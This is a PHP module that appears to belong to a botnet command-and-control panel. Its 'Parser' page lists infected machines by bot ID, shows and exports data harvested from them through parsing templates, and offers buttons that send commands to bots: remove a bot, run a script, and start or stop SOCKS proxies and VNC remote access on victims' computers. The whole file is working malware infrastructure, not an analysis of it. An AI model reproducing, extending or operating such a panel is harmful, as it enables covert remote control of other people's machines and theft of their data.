<?php


if (!defined('__CP__')) {
	exit();
}

define('PARSER_DATA_LIMIT', 100);
include_once __DIR__ . '/../gate/libs/Normalizer.php';
$srv = (isset($_REQUEST['srv']) ? $_REQUEST['srv'] : NULL);
$normalizer = new CntNormalizer();
$filterHtml = '<b>Filters</b><br>' . "\r\n" . '  <form class="form-group-sm" id="filter" style="margin-top: 5px">' . "\r\n" . '  <input type="hidden" name="m" value="parser" />' . '<span>Templates:</span>' . makeSelectItem('srv', $normalizer->names(), $srv, 'Select') . '<br><input type="submit" value="Accept" class="btn btn-primary btn-sm" /> ' . '<input type="button" class="btn btn-danger btn-sm" value="Reset form" onclick="location.href=\'?m=parser\'" />' . '</form>';
$actionsNew = '<div>' . '<input type="submit" class="btn btn-primary btn-sm" value="Full information" onclick="document.getElementById(\'actionName\').value=\'fullinfo\';">&nbsp;' . '<input type="submit" class="btn btn-primary btn-sm" value="Today data" onclick="document.getElementById(\'actionName\').value=\'today_dbreports\';">&nbsp;' . '<input type="submit" class="btn btn-primary btn-sm" value="Data for last week" onclick="document.getElementById(\'actionName\').value=\'week_dbreports\';">&nbsp;' . '<input type="submit" class="btn btn-primary btn-sm" value="Look data in reports" onclick="document.getElementById(\'actionName\').value=\'files\';">&nbsp;' . '<input type="submit" class="btn btn-primary btn-sm" value="Script" onclick="document.getElementById(\'actionName\').value=\'newscript\';">&nbsp;' . '<input type="submit" class="btn btn-danger btn-sm" value="Remove bot" onclick="document.getElementById(\'actionName\').value=\'removeex\';">&nbsp;' . '</div><div style="margin-top: 5px">' . '<input type="submit" class="btn btn-success btn-sm" value="Activate socks" onclick="document.getElementById(\'actionName\').value=\'activate_socks\';">&nbsp;' . '<input type="submit" class="btn btn-success btn-sm" value="Activate vnc" onclick="document.getElementById(\'actionName\').value=\'activate_vnc\';">&nbsp;' . '<input type="submit" class="btn btn-success btn-sm" value="Get socks" onclick="document.getElementById(\'actionName\').value=\'port_socks\';">&nbsp;' . '<input type="submit" class="btn btn-success btn-sm" value="Get VNC" onclick="document.getElementById(\'actionName\').value=\'port_vnc\';">&nbsp;' . '<input type="submit" class="btn btn-success btn-sm" value="Stop socks" onclick="document.getElementById(\'actionName\').value=\'stop_socks\';">&nbsp;' . '<input type="submit" class="btn btn-success btn-sm" value="Stop vnc" onclick="document.getElementById(\'actionName\').value=\'stop_vnc\';">&nbsp;' . '</div>' . '<div style="margin-top: 5px">' . '<input type="submit" class="btn btn-primary btn-sm" value="Download templates" onclick="document.getElementById(\'mainform\').target=\'_self\';document.getElementById(\'actionName\').value=\'download_templates\';">&nbsp;' . '</div>';

if (@$_REQUEST['sub'] == 'options') {
	if (isset($_POST['parser_option'])) {
		if ($_POST['parser_option'] == 'save') {
			$normalizer->fromText($_POST['parser_tpl']);
			$normalizer->saveTemplates();
			header('Location: ' . $_SERVER['HTTP_REFERER']);
		}
		else {
			httpDownloadHeaders('rules.txt', 0);
			echo $normalizer->toText("\r\n");
		}

		exit();
	}

	ThemeBegin('Parser', 0, getBotJsMenu('botmenu'), 0, $filterHtml, false, '', false);
	echo '<b>Add templates</b><br>' . '<form method="post">' . '<input type="hidden" name="parser_option" value="save" id="parser_option">' . '<textarea style="width: 100%; height: 480px" name="parser_tpl">' . $normalizer->toText() . '</textarea>' . '<br><input class="btn btn-primary" type="submit" value="Save" onclick="document.getElementById(\'parser_option\').value=\'save\'"> ' . '<input class="btn btn-primary" type="submit" value="Download data" onclick="document.getElementById(\'parser_option\').value=\'download\'">' . '</form>';
}
else {
	if ($srv && defined('__CP__')) {
		$page = intval(@$_REQUEST['page']);

		if (!$page) {
			$page = 1;
		}

		$botid = (isset($_REQUEST['botid']) ? $_REQUEST['botid'] : NULL);
		$dataset = (!$botid ? $normalizer->get($srv, PARSER_DATA_LIMIT, PARSER_DATA_LIMIT * ($page - 1)) : $normalizer->getDetail($srv, $botid));

		if (@$_REQUEST['botsaction'] == 'download_templates') {
			$cid = 0;
			$data = $srv;

			while ($row = mysql_fetch_array($dataset)) {
				if (!in_array($row['bot_id'], @$_POST['bots'])) {
					continue;
				}

				if ($cid != $row['id']) {
					$i = 0;
					$data .= "\r\n";
					$cid = $row['id'];
				}

				$data .= $tpl['fields'][$i] . ':' . $row['value'] . ';';
				$i++;
			}

			httpDownloadHeaders('templates.txt', strlen($data));
			echo $data;
			exit();
		}

		ThemeBegin('Parser', 0, getBotJsMenu('botmenu'), 0, $filterHtml, false, '', true);
		echo '<form method="post" name="botslist" target="_blank" action="?" id="mainform">' . '<input type="hidden" name="page" value="' . $page . '">' . '<input type="hidden" name="bots[]" value="">' . '<input type="hidden" name="srv" value="' . htmlspecialchars($srv) . '">' . '<input type="hidden" name="botsaction" id="actionName">';
		$count = $normalizer->count($srv);

		if (!$botid) {
			print($actionsNew . '<br>Total bots: ' . $count . '<br>Pages: ' . pageNavigator($count, $page, PARSER_DATA_LIMIT) . '<br><br>');
		}
		if ($botid) {
			print('<b>Bot ' . htmlspecialchars($botid) . ' history</b><br><br>');
		}

		print('<table class="table table-striped table-bordered table-hover" style="width: 100%">' . '<tr style="font-weight: bold"><td style="width: 1px"><input type="checkbox" onclick="checkAll()" name="checkall"></td><td>BotID</td><td>Time</td>');

		if (!$botid) {
			print('<td>History</td>');
		}

		foreach ($tpl['fields'] as $field) {
			print('<td>' . $field . '</td>');
		}

		print('</tr>');
		$cid = NULL;

		while ($row = mysql_fetch_array($dataset)) {
			if ($cid != $row['id']) {
				print('</tr><tr>' . '<td><input type="checkbox" name="bots[]" value="' . htmlspecialchars($row['bot_id']) . '" ></td>' . '<td>' . botPopupMenu($row['bot_id'], 'botmenu') . '</td>' . '<td>' . date('d.m.Y H:i', $row['logtime']) . '</td>');

				if (!$botid) {
					print('<td><a target="_blank" href=?' . $_SERVER['QUERY_STRING'] . '&botid=' . htmlspecialchars($row['bot_id']) . '>View history</a></td>');
				}

				$cid = $row['id'];
			}

			print('<td>' . htmlspecialchars($row['value']) . '</td>');
		}

		print('</table></form>');
	}
	else {
		ThemeBegin('Parser', 0, getBotJsMenu('botmenu'), 0, $filterHtml, false, '', false);
		print('Select template in <span class="label-rightmenu">right menu</span>');
	}
}

echo '<script type="text/javascript">' . jsCheckAll('botslist', 'checkall', 'bots[]') . '</script>';
ThemeEnd();

?>
